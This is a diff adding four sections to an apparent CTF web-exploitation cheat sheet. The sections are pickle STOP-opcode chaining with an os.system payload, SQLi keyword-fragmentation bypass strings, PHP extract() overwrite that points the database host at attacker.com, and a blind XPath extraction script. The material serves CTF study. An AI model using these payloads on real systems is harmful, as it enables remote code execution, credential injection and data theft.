@@ -12,6 +12,7 @@
   - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
   - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
   - [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
+  - [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
   - [Jinja2 RCE](#jinja2-rce)
   - [Go Template Injection](#go-template-injection)
@@ -46,6 +47,9 @@
   - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
   - [ZipSlip + SQLi](#zipslip--sqli)
 - [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
+- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
+- [PHP extract() / register_globals Variable Overwrite (SecuInside 2013)](#php-extract--register_globals-variable-overwrite-secuinside-2013)
+- [XPath Blind Injection (BaltCTF 2013)](#xpath-blind-injection-baltctf-2013)
 - [WebSocket Mass Assignment](#websocket-mass-assignment)
 - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
@@ -773,3 +777,94 @@ seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
 - `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
 - File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
 - Redis `GET` then `SET` without `WATCH`/`MULTI`
+
+---
+
+## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)
+
+**Pattern:** Chain multiple pickle operations in a single `pickle.loads()` call by stripping the STOP opcode (`\x2e`) from the first payload and concatenating a second payload.
+
+**Key insight:** The pickle VM executes instructions sequentially. Removing the STOP opcode from the first serialized object causes the deserializer to continue executing the second payload's `__reduce__` call. Combined with `os.dup2()` to redirect stdout to the socket FD, this enables output capture from `os.system()` over the network.
+
+```python
+import pickle, os
+
+class Redirect:
+    def __reduce__(self):
+        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5
+
+class Execute:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+# Strip STOP opcode from first payload, concatenate second
+payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
+```
+
+**When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.
+
+---
+
+## SQLi Keyword Fragmentation Bypass (SecuInside 2013)
+
+**Pattern:** Single-pass `preg_replace()` keyword filters can be bypassed by nesting the stripped keyword inside the payload word.
+
+**Key insight:** If the filter strips `load_file` in a single pass, `unload_fileon` becomes `union` after removal. The inner keyword acts as a sacrificial fragment.
+
+```php
+// Vulnerable filter (single-pass, case-sensitive)
+$str = preg_replace("/union/", "", $str);
+$str = preg_replace("/select/", "", $str);
+$str = preg_replace("/load_file/", "", $str);
+$str = preg_replace("/ /", "", $str);
+```
+
+```sql
+-- Bypass payload (spaces replaced with /**/ comments)
+(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
+-- Or nest the stripped keyword:
+unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
+```
+
+**Variations:** Case-sensitive filters: mix case (`unIoN`). Space filters: `/**/`, `%09`, `%0a`. Recursive filters: double the keyword (`ununionion`). Always test whether the filter is single-pass or recursive.
+
+---
+
+## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)
+
+**Pattern:** `extract($_GET)` or `extract($_POST)` overwrites internal PHP variables with user-supplied values, enabling database credential injection, path manipulation, or authentication bypass.
+
+```php
+// Vulnerable pattern
+if (!ini_get("register_globals")) extract($_GET);
+// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
+```
+
+```text
+GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
+```
+
+**Key insight:** `extract()` imports array keys as local variables. Overwrite database connection parameters to point to an attacker-controlled MySQL server, then return crafted query results (file paths, credentials, etc.).
+
+**Detection:** Search source for `extract($_GET)`, `extract($_POST)`, `extract($_REQUEST)`. PHP `register_globals` (removed in 5.4) had the same effect globally.
+
+---
+
+## XPath Blind Injection (BaltCTF 2013)
+
+**Pattern:** XPath queries constructed from user input enable blind data extraction via boolean-based or content-length oracles.
+
+```text
+-- Injection in sort/filter parameter:
+1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2
+
+-- Boolean detection: response length > threshold = true
+-- Extract character by character:
+for pos in range(1, 100):
+    for c in string.printable:
+        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
+        if len(requests.get(url, params={'sort': payload}).text) > 1050:
+            result += c; break
+```
+
+**Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).
